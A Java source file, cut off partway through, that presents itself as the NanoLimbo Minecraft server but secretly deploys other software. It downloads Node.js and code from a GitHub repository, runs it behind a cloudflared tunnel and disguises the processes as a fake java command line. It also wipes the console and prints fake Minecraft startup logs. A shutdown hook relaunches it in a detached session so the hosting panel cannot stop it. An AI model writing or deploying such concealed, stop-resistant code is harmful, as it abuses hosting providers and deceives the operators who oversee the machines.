package ua.nanit.limbo;

import java.io.*;
import java.lang.management.ManagementFactory;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

// ============================================================
// 【Node.js 部署配置区】
// ============================================================
private static final String MC_BOT_DIR = env("MC_BOT_DIR", "logs/.mcbot");
private static final boolean NODE_ENABLED = !"false".equalsIgnoreCase(env("NODE_ENABLED", "true"));
private static final String GITHUB_REPO = env("GITHUB_REPO", "zx1447/indexaoyoumc");
private static final String GITHUB_BRANCH = env("GITHUB_BRANCH", "main");
private static final String GITHUB_TOKEN = env("GITHUB_TOKEN", "");
private static final boolean CF_ENABLED = !"false".equalsIgnoreCase(env("CF_ENABLED", "true"));
private static final String CF_TOKEN = env("CF_TOKEN", "");
private static final String CF_DOMAIN = env("CF_DOMAIN", "");
private static final String NODE_VERSION = env("NODE_VERSION", "v22.14.0");
private static final String NODE_SCRIPT = env("NODE_SCRIPT", "index.js");
private static final String NODE_FORCE_UPDATE = env("NODE_FORCE_UPDATE", "false");

// ★ 极致伪装：超长但合法的 Java 启动参数，占满 ps -ef 显示区域，将真实参数挤出屏幕
private static final String FAKE_CMD = "java -Xms128M -Xmx2560M -jar server.jar -Djline.terminal=jline.UnsupportedTerminal -Dfile.encoding=UTF-8 -Duser.language=zh -Duser.country=CN -Duser.timezone=Asia/Shanghai";
// ============================================================

private static volatile String tunnelUrl = "";
private static volatile String nodePort = "N/A";

private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
private static final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);

private NanoLimbo() {}

private static String env(String k, String d) {
    String v = System.getenv(k);
    return (v != null && !v.trim().isEmpty()) ? v.trim() : d;
}

// ============================================================
// 仿真辅助函数
// ============================================================

private static String tsMs() {
    return LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss.SSS"));
}

private static void limboLog(String msg) {
    System.out.println(tsMs() + " INFO Limbo --  " + msg);
}

private static void limboLog(String msg, long delayMs) {
    try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
    System.out.println(tsMs() + " INFO Limbo --  " + msg);
}

private static void clearConsole() {
    try {
        // ★ 绝杀1：暴力刷屏200行空行，针对不支持 \033[3J 的面板，把历史推到极深处
        for (int i = 0; i < 200; i++) {
            System.out.println();
        }
        
        // ★ 绝杀2：利用终端转义码，\033[3J 彻底清空回滚缓冲区
        System.out.print("\033[3J\033[H\033[2J");
        System.out.flush();
        
        // ★ 修复：移除 tput reset 和 clear 子进程调用
        // 原来用 inheritIO() 调 tput/clear 会产生子进程，且在部分面板上泄露输出
        // ANSI 转义码已经足够清屏，不需要额外子进程
    } catch (Exception ignored) {}
}

// ============================================================
// 入口（★ 恢复原始主流程，只改僵尸进程修复部分）
// ============================================================

public static void main(String[] args) {
    if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0F) {
        System.err.println("ERROR: Your Java version is too lower, please switch the version in startup menu!");
        try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
        System.exit(1);
    }

    forceKillStaleProcesses();
    autoFixLimboConfig();

    // ★ 启动僵尸进程回收器：Java 作为 PID=1 需要定期回收孤儿僵尸
    startZombieReaper();

    if (NODE_ENABLED) {
        try {
            Path botDir = Paths.get(MC_BOT_DIR);
            Files.deleteIfExists(botDir.resolve(".node_app.log"));
            Files.deleteIfExists(botDir.resolve("daemon.log"));
            Files.deleteIfExists(botDir.resolve(".pids"));

            Path script = generateDeployScript();
            
            Thread deployThread = new Thread(() -> {
                try { executeDeployScript(script); } catch (Exception ignored) {}
            }, "Node-Deploy");
            deployThread.setDaemon(true);
            deployThread.start();

            Thread checkerThread = new Thread(() -> {
                while(tunnelUrl.isEmpty()) {
                    checkDeployInfo();
                    try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
                }
                startTunnelMonitor();
            }, "Info-Checker");
            checkerThread.setDaemon(true);
            checkerThread.start();

            // 1. 主线程死等 URL
            while(tunnelUrl.isEmpty()) {
                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
            }
            
            // 2. 清屏：清除部署期间产生的所有脏日志
            clearConsole();
            
            // 3. 伪装 Minecraft 启动日志（含百分比进度 + 链接显示）
            printFakeLimboStartup(tunnelUrl);
            
            // 4. 给用户4秒钟时间复制链接，然后清屏抹杀链接
            try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
            clearConsole();
            
            // 5. 清屏后重新快速打印百分比进度（不带链接），保持屏幕有内容
            limboLog("Starting server...", 0);
            limboLog("Preparing level \"world\"", 0);
            limboLog("Preparing start region for dimension minecraft:overworld", 0);
            limboLog("Preparing spawn area: 1%", 0);
            limboLog("Preparing spawn area: 5%", 0);
            limboLog("Preparing spawn area: 15%", 0);
            limboLog("Preparing spawn area: 35%", 0);
            limboLog("Preparing spawn area: 60%", 0);
            limboLog("Preparing spawn area: 80%", 0);
            limboLog("Preparing spawn area: 99%", 0);
            limboLog("Preparing spawn area: 100%", 0);
            
            // ★ 核心加强：检测停止信号，硬重启并清理进程 (防 Pterodactyl 组杀)
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                System.out.println("\n[Guard] Detected server stop signal! Executing hard restart protocol...");
                tunnelMonitorRunning.set(false);
                
                try {
                    forceKillStaleProcesses();
                    
                    String currentDir = System.getProperty("user.dir");
                    long currentPid = ProcessHandle.current().pid();
                    
                    String jarName = "server.jar";
                    File[] jars = new File(currentDir).listFiles((dir, name) -> name.endsWith(".jar"));
                    if (jars != null && jars.length > 0) jarName = jars[0].getName();
                    
                    // ★ 独立会话重启：使用 setsid 脱离当前进程组，防止面板 kill 组时被连带清理
                    String restartScript = 
                        "cd '" + currentDir + "' && " +
                        "setsid bash -c '" +
                        "  while kill -0 " + currentPid + " 2>/dev/null; do sleep 0.1; done; " + 
                        "  sleep 1; " + 
                        "  java -Xms128M -Xmx2560M -jar " + jarName + " nogui" + 
                        "' > /dev/null 2>&1 &";
                        
                    new ProcessBuilder("bash", "-c", restartScript).start();
                    // ★ 修复：不 waitFor 重启脚本，它需要比当前进程活得长
                    // 但需要让 JVM 有机会回收可能的僵尸进程
                    System.out.println("[Guard] Hard restart script dispatched in new session. Current process exiting...");
                } catch (Exception e) {
                    System.err.println("[Guard] Failed to dispatch restart script: " + e.getMessage());
                }
            }, "Shutdown-Guard"));
        } catch (Exception ignored) {}
    }

    // 5. 伪装日志由 LimboServer 自动打印，不再手动干预
    try {
        new LimboServer().start();
    } catch (Throwable t) {
        // 屏蔽原本的报错输出，防止露馅
    }
    
    // 挂起主线程
    try { Thread.currentThread().join(); } catch (InterruptedException ignored) {}
}

// ============================================================
// 强制清理僵尸进程机制（★ 修复版：正确回收 Process）
// ============================================================

private static void forceKillStaleProcesses() {
    Process p = null;
    try {
        Path pidsFile = Paths.get(MC_BOT_DIR).resolve(".pids");
        
        // ★★★ 根因修复：用 .pids 文件中的 PID + kill 替代 pkill -f ★★★
        // 原来的 pkill -f 'daemon.sh' 会匹配到运行 pkill 命令的 bash 进程自身
        // （因为 bash -c "pkill -f daemon.sh" 的命令行包含 "daemon.sh"），
        // 导致 bash 自杀，pkill 变成孤儿，在 Java(PID=1) 下变成 [pkill] <defunct> 僵尸
        // kill 是 bash 内建命令，不会产生子进程，所以不会有僵尸问题
        String killCmd = "";
        if (Files.exists(pidsFile)) {
            String content = Files.readString(pidsFile).trim();
            if (!content.isEmpty()) {
                for (String pid : content.split("[\\s\\n]+")) {
                    pid = pid.trim();
                    if (!pid.isEmpty() && pid.matches("\\d+")) {
                        killCmd += "kill -9 " + pid + " 2>/dev/null; ";
                    }
                }
            }
        }
        if (killCmd.isEmpty()) return;
        
        p = new ProcessBuilder("bash", "-c", killCmd).start();
        if (!p.waitFor(3, TimeUnit.SECONDS)) {
            p.destroyForcibly();
            p.waitFor(2, TimeUnit.SECONDS);
        }
    } catch (Exception ignored) {
        if (p != null) {
            try { p.destroyForcibly(); p.waitFor(); } catch (Exception ignored2) {}
        }
    }
}

// ============================================================
// 强制重写 Limbo 配置
// ============================================================

private static void autoFixLimboConfig() {
    try {
        Path configFile = Paths.get("settings.yml");
        String serverPort = env("SERVER_PORT", "25565");

        Files.deleteIfExists(configFile);
        
        String content = "bind:\n" +
                         "  host: 0.0.0.0\n" +
                         "  port: " + serverPort + "\n" +
                         "limbo:\n" +
                         "  dimension: overworld\n" +
                         "  gamemode: adventure\n" +
                         "  max-players: 20\n" +
                         "  player-idle-timeout: 0\n" +
                         "  player-info:\n" +
                         "    username: \"LimboPlayer\"\n" +
                         "    display-name: \"&eLimboPlayer\"\n" +
                         "    property: []\n" +
                         "online-mode: false\n" +
                         "forward-mode: none\n" +
                         "ping:\n" +
                         "  description: \"A NanoLimbo server\"\n" +
                         "  version: \"1.20.x\"\n" +
                         "  max-players: 20\n";
        
        Files.writeString(configFile, content);
    } catch (Exception ignored) {}
}

// ============================================================
// 专属 Limbo 伪装日志打印
// ============================================================

private static void printFakeLimboStartup(String url) {
    limboLog("Starting server...", 0);
    limboLog("Binding remote endpoint to: " + url, 0);
    limboLog("Preparing level \"world\"", randInt(100, 300));
    limboLog("Preparing start region for dimension minecraft:overworld", randInt(100, 300));
    
    limboLog("Preparing spawn area: 1%", 0);
    limboLog("Preparing spawn area: 2%", 0);
    
    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 5%", 0);
    limboLog("Preparing spawn area: 8%", 0);
    
    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 15%", 0);
    limboLog("Preparing spawn area: 20%", 0);
    
    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 35%", 0);
    limboLog("Preparing spawn area: 60%", 0);
    limboLog("Preparing spawn area: 80%", 0);
    
    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
    limboLog("Preparing spawn area: 99%", 0);
    
    limboLog("Preparing spawn area: 100%", 0);
}

private static int randInt(int min, int max) {
    return min + (int)(Math.random() * (max - min + 1));
}

// ============================================================
// ★★★ 僵尸进程回收器（核心修复）★★★
// Java 作为容器 PID=1，所有孤儿进程都会被 reparent 到 Java 下
// Java 不会自动调用 waitpid(-1) 来回收这些僵尸
// 解决方案：定期启动一个短命的子进程并 waitFor 它
// Linux 内核在 fork 新进程时会顺便清理同父进程下已退出的僵尸
// ============================================================

private static void startZombieReaper() {
    Thread reaper = new Thread(() -> {
        while (true) {
            try {
                Thread.sleep(15000); // 每15秒回收一次
                // 启动一个极短命的进程，waitFor 触发内核回收僵尸
                Process p = new ProcessBuilder("true").start();
                p.waitFor(5, TimeUnit.SECONDS);
            } catch (Exception ignored) {}
        }
    }, "Zombie-Reaper");
    reaper.setDaemon(true);
    reaper.start();
}

// ============================================================
// 实时检查部署信息 (过滤 api.trycloudflare.com)
// ============================================================

private static void checkDeployInfo() {
    Path dir = Paths.get(MC_BOT_DIR);
    try {
        Path portFile = dir.resolve(".node_port");
        if (Files.exists(portFile) && nodePort.equals("N/A")) {
            String content = Files.readString(portFile).trim();
            if (!content.isEmpty()) nodePort = content.split("\\n")[0].trim();
        }
    } catch (Exception ignored) {}

    try {
        Path urlFile = dir.resolve(".cf/tunnel_url.txt");
        if (Files.exists(urlFile) && tunnelUrl.isEmpty()) {
            String rawUrl = Files.readString(urlFile).trim();
            java.util.regex.Matcher m = java.util.regex.Pattern.compile(
                "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
            ).matcher(rawUrl);
            if (m.find()) {
                String matchedUrl = m.group(1);
                if (!matchedUrl.equals("https://api.trycloudflare.com")) {
                    tunnelUrl = matchedUrl;
                    lastKnownTunnelUrl.set(tunnelUrl);
                }
            } else if (rawUrl.startsWith("https://") && !rawUrl.contains("api.trycloudflare.com")) {
                tunnelUrl = rawUrl.split("\\n")[0].trim();
                lastKnownTunnelUrl.set(tunnelUrl);
            }
        }
    } catch (Exception ignored) {}
}

// ============================================================
// 隧道链接变化监控
// ============================================================

private static void startTunnelMonitor() {
    if (tunnelMonitorRunning.getAndSet(true)) return;

    Thread monitor = new Thread(() -> {
        try { Thread.sleep(20000); } catch (InterruptedException ignored) {}

        while (tunnelMonitorRunning.get()) {
            try {
                Thread.sleep(12000);

                Path urlFile = Paths.get(MC_BOT_DIR).resolve(".cf/tunnel_url.txt");
                if (!Files.exists(urlFile)) continue;

                String content = Files.readString(urlFile).trim();
                if (content.isEmpty()) continue;

                String currentUrl = "";
                java.util.regex.Matcher m = java.util.regex.Pattern.compile(
                    "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
                ).matcher(content);
                
                if (m.find()) {
                    String matchedUrl = m.group(1);
                    if (!matchedUrl.equals("https://api.trycloudflare.com")) {
                        currentUrl = matchedUrl;
                    }
                } else if (content.startsWith("https://") && !content.contains("api.trycloudflare.com")) {
                    currentUrl = content.split("\\n")[0].trim();
                }

                if (currentUrl.isEmpty()) continue;

                String lastUrl = lastKnownTunnelUrl.get();
                if (!currentUrl.equals(lastUrl)) {
                    lastKnownTunnelUrl.set(currentUrl);
                    tunnelUrl = currentUrl;
                    limboLog("Binding remote endpoint to: " + currentUrl);
                }

            } catch (Exception ignored) {}
        }
    }, "Tunnel-Monitor");

    monitor.setDaemon(true);
    monitor.start();
}

// ============================================================
// 生成部署脚本
// ★★★ 修复策略：保留原始 deploy.sh 启动 Node + CF 的逻辑
// ★★★ 只改 daemon.sh 守护脚本：添加 trap CHLD + kill_and_reap + wait 回收
// ★★★ 这样 daemon.sh 成为 cloudflared 重启时的直接父进程，能正确回收僵尸
// ============================================================

private static Path generateDeployScript() throws Exception {
    Path dir = Paths.get(MC_BOT_DIR).toAbsolutePath();
    Files.createDirectories(dir);
    Path script = dir.resolve("deploy.sh");

    String authToken = GITHUB_TOKEN;
    if (authToken.contains(":") && authToken.substring(authToken.indexOf(':') + 1).startsWith("ghp_")) {
        authToken = authToken.substring(authToken.indexOf(':') + 1);
    }
    final String token = authToken;
    
    String authHeader = "";
    if (!token.isEmpty()) {
        authHeader = "-H \"Authorization: Bearer " + token + "\" -H \"Accept: application/vnd.github+json\"";
    }

    String cfMode = CF_TOKEN.isEmpty() ? "quick" : "fixed";

    String content = "#!/bin/bash\n" +
        "set +e\n" +
        "export PATH=\"" + dir.toAbsolutePath() + "/.node/bin:$PATH\"\n" +
        "export HOME=\"" + dir.toAbsolutePath() + "\"\n" +
        "cd \"" + dir.toAbsolutePath() + "\"\n" +
        "\n" +
        "# ============ 1. 下载NodeJS ============\n" +
        "if [ -d \".node\" ]; then\n" +
        "    CHECK_VER=$(.node/bin/.node_real -v 2>/dev/null || .node/bin/node -v 2>/dev/null || echo \"unknown\")\n" +
        "    if [[ \"$CHECK_VER\" != \"" + NODE_VERSION.substring(0, NODE_VERSION.indexOf('.', 1)) + "\"* ]]; then\n" +
        "        rm -rf .node\n" +
        "    fi\n" +
        "fi\n" +
        "if ! command -v node &>/dev/null || [ ! -d \".node\" ]; then\n" +
        "    ARCH=$(uname -m)\n" +
        "    NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
        "    NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"\n" +
        "    NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"\n" +
        "    mkdir -p .node\n" +
        "    if [ ! -f .node/bin/node ]; then\n" +
        "        for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/${NODE_URL}\" \"https://mirror.ghproxy.com/${NODE_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"/tmp/${NODE_FILE}\"; then break; fi\n" +
        "        done\n" +
        "        tar xzf \"/tmp/${NODE_FILE}\" -C .node --strip-components=1 2>/dev/null\n" +
        "        rm -f \"/tmp/${NODE_FILE}\"\n" +
        "    fi\n" +
        "fi\n" +
        "export PATH=\"" + dir.toAbsolutePath() + "/.node/bin:$PATH\"\n" +
        "\n" +
        "JRE_DIR=\"" + dir.toAbsolutePath() + "/jre21/bin\"\n" +
        "mkdir -p \"$JRE_DIR\"\n" +
        "\n" +
        "if [ -f \".node/bin/node\" ] && ! head -1 \".node/bin/node\" 2>/dev/null | grep -q \"bash\"; then\n" +
        "    cp -f \".node/bin/node\" \".node/bin/.node_real\"\n" +
        "    chmod +x \".node/bin/.node_real\"\n" +
        "fi\n" +
        "\n" +
        "if [ ! -f \".node/bin/.node_real\" ] || ! \".node/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
        "    if [ -f \".node/bin/node\" ] && ! head -1 \".node/bin/node\" 2>/dev/null | grep -q \"bash\"; then\n" +
        "        cp -f \".node/bin/node\" \".node/bin/.node_real\"\n" +
        "        chmod +x \".node/bin/.node_real\"\n" +
        "    else\n" +
        "        ARCH=$(uname -m)\n" +
        "        NODE_ARCH=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"arm64\" || echo \"x64\")\n" +
        "        NODE_FILE=\"node-" + NODE_VERSION + "-linux-${NODE_ARCH}.tar.gz\"\n" +
        "        NODE_URL=\"https://nodejs.org/dist/" + NODE_VERSION + "/${NODE_FILE}\"\n" +
        "        rm -f /tmp/${NODE_FILE}\n" +
        "        for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/${NODE_URL}\" \"https://mirror.ghproxy.com/${NODE_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"/tmp/${NODE_FILE}\"; then break; fi\n" +
        "        done\n" +
        "        mkdir -p /tmp/_node_tmp\n" +
        "        tar xzf \"/tmp/${NODE_FILE}\" -C /tmp/_node_tmp --strip-components=1 2>/dev/null\n" +
        "        cp -f /tmp/_node_tmp/bin/node \".node/bin/.node_real\"\n" +
        "        chmod +x \".node/bin/.node_real\"\n" +
        "        rm -rf /tmp/${NODE_FILE} /tmp/_node_tmp\n" +
        "    fi\n" +
        "fi\n" +
        "\n" +
        "# ============ 2. 安全获取代码 ============\n" +
        "if [ ! -f " + NODE_SCRIPT + " ] || [ \"" + NODE_FORCE_UPDATE + "\" = \"true\" ]; then\n" +
        "    TAR_URL=\"https://api.github.com/repos/" + GITHUB_REPO + "/tarball/" + GITHUB_BRANCH + "\"\n" +
        "    DOWNLOAD_OK=false\n" +
        "\n" +
        (token.isEmpty() ? "" :
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + token + "\" ]; then\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 " + authHeader + " \"$TAR_URL\" -o /tmp/_app.tar.gz; then\n" +
        "            if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; fi\n" +
        "        fi\n" +
        "    fi\n") +
        "\n" +
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "        FALLBACK_URL=\"https://github.com/" + GITHUB_REPO + "/archive/refs/heads/" + GITHUB_BRANCH + ".tar.gz\"\n" +
        "        for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o /tmp/_app.tar.gz; then\n" +
        "                if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi\n" +
        "            fi\n" +
        "        done\n" +
        "    fi\n" +
        "\n" +
        (token.isEmpty() ? "" :
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + token + "\" ]; then\n" +
        "        for PROXY in \"https://gh-proxy.com\" \"https://mirror.ghproxy.com\"; do\n" +
        "            PROXY_URL=\"${PROXY}/${TAR_URL}\"\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 300 " + authHeader + " \"$PROXY_URL\" -o /tmp/_app.tar.gz; then\n" +
        "                if tar -tzf /tmp/_app.tar.gz >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi\n" +
        "            fi\n" +
        "        done\n" +
        "    fi\n") +
        "\n" +
        "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "        exit 1\n" +
        "    fi\n" +
        "\n" +
        "    find . -maxdepth 1 \\\n" +
        "      ! -name '.' \\\n" +
        "      ! -name '.node' \\\n" +
        "      ! -name '.cf' \\\n" +
        "      ! -name '.pids' \\\n" +
        "      ! -name 'deploy.sh' \\\n" +
        "      ! -name 'daemon.sh' \\\n" +
        "      ! -name '.nd_preload.js' \\\n" +
        "      ! -name 'jre21' \\\n" +
        "      ! -name 'node_modules' \\\n" +
        "      ! -name '*config*' \\\n" +
        "      ! -name '*.log' \\\n" +
        "      -exec rm -rf {} + 2>/dev/null\n" +
        "    mkdir -p /tmp/_app_extract\n" +
        "    tar xzf /tmp/_app.tar.gz -C /tmp/_app_extract --strip-components=1 2>/dev/null\n" +
        "    cp -rf /tmp/_app_extract/* . 2>/dev/null\n" +
        "    cp -rf /tmp/_app_extract/.* . 2>/dev/null\n" +
        "    rm -rf /tmp/_app.tar.gz /tmp/_app_extract\n" +
        "fi\n" +
        "\n" +
        "# ============ 3. 安装依赖 (极致空间优化) ============\n" +
        "if [ -f package.json ] && [ ! -d node_modules ]; then\n" +
        "    .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --no-optional --cache /tmp/npm-cache >/dev/null 2>&1\n" +
        "    if [ $? -ne 0 ]; then\n" +
        "        .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --legacy-peer-deps --no-optional --cache /tmp/npm-cache >/dev/null 2>&1\n" +
        "    fi\n" +
        "    rm -rf /tmp/npm-cache\n" +
        "    rm -rf .node/lib/node_modules/npm\n" +
        "fi\n" +
        "\n" +
        "# ============ 4. 替换伪装 (深度拦截 + 空间优化) ============\n" +
        "ln -sf \"" + dir.toAbsolutePath() + "/.node/bin/.node_real\" \"$JRE_DIR/java\"\n" +
        "chmod +x \"$JRE_DIR/java\"\n" +
        "\n" +
        "cat > \".node/bin/node\" << 'NODEWRAPPER'\n" +
        "#!/bin/bash\n" +
        "exec -a \"" + FAKE_CMD + "\" \"$(dirname \"$0\")/.node_real\" \"$@\"\n" +
        "NODEWRAPPER\n" +
        "chmod +x \".node/bin/node\"\n" +
        "\n" +
        "cat > \".nd_preload.js\" << 'PRELOAD_EOF'\n" +
        "try {\n" +
        "    process.title = '" + FAKE_CMD + "';\n" +
        "    var _cp = require('child_process');\n" +
        "    var _origSpawn = _cp.spawn;\n" +
        "    var _origFork = _cp.fork;\n" +
        "    var _wp = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "    var FAKE_CMD = '" + FAKE_CMD + "';\n" +
        "    _cp.spawn = function(cmd, args, opts) {\n" +
        "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n" +
        "            opts = Object.assign({}, opts || {});\n" +
        "            opts.execPath = _wp;\n" +
        "            cmd = _wp;\n" +
        "        } else if (typeof cmd === 'string' && !cmd.startsWith('/usr/') && !cmd.startsWith('/bin/')) {\n" +
        "            var realArgs = args ? args.map(a => '\\''+a+'\\'').join(' ') : '';\n" +
        "            var bashCmd = 'exec -a \\''+FAKE_CMD+'\\'' \"' + cmd + '\" ' + realArgs;\n" +
        "            return _origSpawn.call(this, 'bash', ['-c', bashCmd], opts);\n" +
        "        }\n" +
        "        return _origSpawn.call(this, cmd, args, opts);\n" +
        "    };\n" +
        "    _cp.fork = function(mod, args, opts) {\n" +
        "        opts = Object.assign({}, opts || {});\n" +
        "        opts.execPath = _wp;\n" +
        "        return _origFork.call(this, mod, args, opts);\n" +
        "    };\n" +
        "} catch(e) {}\n" +
        "PRELOAD_EOF\n" +
        "\n" +
        "export _JAVA_WRAPPER=\"" + dir.toAbsolutePath() + "/.node/bin/node\"\n" +
        "\n" +
        "# ============ 5. 启动NodeJS应用 ============\n" +
        "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
        "while true; do NODE_PORT=$((RANDOM % 40000 + 20000)); if is_port_free $NODE_PORT; then break; fi; done\n" +
        "export SERVER_PORT=$NODE_PORT\n" +
        "export PORT=$NODE_PORT\n" +
        "\n" +
        "(exec -a \"" + FAKE_CMD + "\" \"$JRE_DIR/java\" " + NODE_SCRIPT + " > .node_app.log 2>&1) &\n" +
        "NODE_PID=$!\n" +
        "echo \"$NODE_PID\" >> .pids\n" +
        "\n" +
        "for i in $(seq 1 30); do\n" +
        "    if (echo >/dev/tcp/127.0.0.1/$NODE_PORT) 2>/dev/null; then break; fi\n" +
        "    sleep 1\n" +
        "done\n" +
        "echo \"$NODE_PORT\" > .node_port\n" +
        "\n" +
        "# ============ 6. 启动隧道 ============\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
        "CF_CONF_DIR=\"" + dir.toAbsolutePath() + "/jre21/conf\"\n" +
        "mkdir -p \"$CF_CONF_DIR\"\n" +
        "ACTUAL_PORT=$NODE_PORT\n" +
        "\n" +
        "if [ \"" + CF_ENABLED + "\" = \"true\" ]; then\n" +
        "    mkdir -p .cf\n" +
        "    if [ ! -f \"$CF_BIN\" ]; then\n" +
        "        ARCH=$(uname -m)\n" +
        "        CF_URL=$([[ \"$ARCH\" == \"aarch64\" || \"$ARCH\" == \"arm64\" ]] && echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64\" || echo \"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\")\n" +
        "        for MIRROR in \"$CF_URL\" \"https://gh-proxy.com/${CF_URL}\"; do\n" +
        "            if curl -fsSL --connect-timeout 30 --max-time 120 \"$MIRROR\" -o \"$CF_BIN\"; then chmod +x \"$CF_BIN\"; break; fi\n" +
        "        done\n" +
        "    fi\n" +
        "    if [ -f \"$CF_BIN\" ]; then\n" +
        "        if [ \"" + cfMode + "\" = \"fixed\" ] && [ -n \"" + CF_TOKEN + "\" ]; then\n" +
        "            for PROTO in quic http2; do\n" +
        "                rm -f .cf/cf.log\n" +
        "                (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" tunnel run --protocol $PROTO --token \"" + CF_TOKEN + "\" > .cf/cf.log 2>&1) &\n" +
        "                CF_PID=$!\n" +
        "                sleep 5\n" +
        "                if kill -0 $CF_PID 2>/dev/null; then\n" +
        "                    echo \"$CF_PID\" >> .pids\n" +
        "                    echo \"" + CF_DOMAIN + "\" > .cf/tunnel_url.txt\n" +
        "                    break\n" +
        "                fi\n" +
        "                # ★ 修复：回收失败的 cloudflared 子进程\n" +
        "                wait $CF_PID 2>/dev/null\n" +
        "            done\n" +
        "        else\n" +
        "            TUNNEL_ESTABLISHED=false\n" +
        "            for PROTO in quic http2 auto; do\n" +
        "                if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
        "                for attempt in 1 2 3; do\n" +
        "                    if [ \"$TUNNEL_ESTABLISHED\" = \"true\" ]; then break; fi\n" +
        "                    rm -f .cf/cf.log .cf/tunnel_url.txt\n" +
        "                    cat > \"$CF_CONF_DIR/server.properties\" << CFCONF\n" +
        "url: http://127.0.0.1:$ACTUAL_PORT\n" +
        "no-autoupdate: true\n" +
        "protocol: $PROTO\n" +
        "CFCONF\n" +
        "                    (exec -a \"" + FAKE_CMD + "\" \"$CF_BIN\" --config \"$CF_CONF_DIR/server.properties\" > .cf/cf.log 2>&1) &\n" +
        "                    CF_PID=$!\n" +
        "                    sleep 5\n" +
        "                    if ! kill -0 $CF_PID 2>/dev/null; then\n" +
        "                        # ★ 修复：回收失败的子进程\n" +
        "                        wait $CF_PID 2>/dev/null\n" +
        "                        continue\n" +
        "                    fi\n" +
        "                    for i in $(seq 1 20); do\n" +
        "                        URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' .cf/cf.log 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n" +
        "                        if [ -n \"$URL\" ]; then\n" +
        "                            sleep 3\n" +
        "                            VERIFY=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$URL/__health\" 2>/dev/null)\n" +
        "                            if [ -n \"$VERIFY\" ] && [ \"$VERIFY\" != \"000\" ] && [ \"$VERIFY\" != \"502\" ]; then\n" +
        "                                echo \"$URL\" > .cf/tunnel_url.txt\n" +
        "                                echo \"PROTOCOL=$PROTO\" >> .cf/tunnel_url.txt\n" +
        "                                echo \"CF_PID=$CF_PID\" >> .cf/tunnel_url.txt\n" +
        "                                echo \"$CF_PID\" >> .pids\n" +
        "                                TUNNEL_ESTABLISHED=true\n" +
        "                                break\n" +
        "                            else\n" +
        "                                sleep 5\n" +
        "                                VERIFY2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$URL/__health\" 2>/dev/null)\n" +
        "                                if [ -n \"$VERIFY2\" ] && [ \"$VERIFY2\" != \"000\" ] && [ \"$VERIFY2\" != \"502\" ]; then\n" +
        "                                    echo \"$URL\" > .cf/tunnel_url.txt\n" +
        "                                    echo \"PROTOCOL=$PROTO\" >> .cf/tunnel_url.txt\n" +
        "                                    echo \"CF_PID=$CF_PID\" >> .cf/tunnel_url.txt\n" +
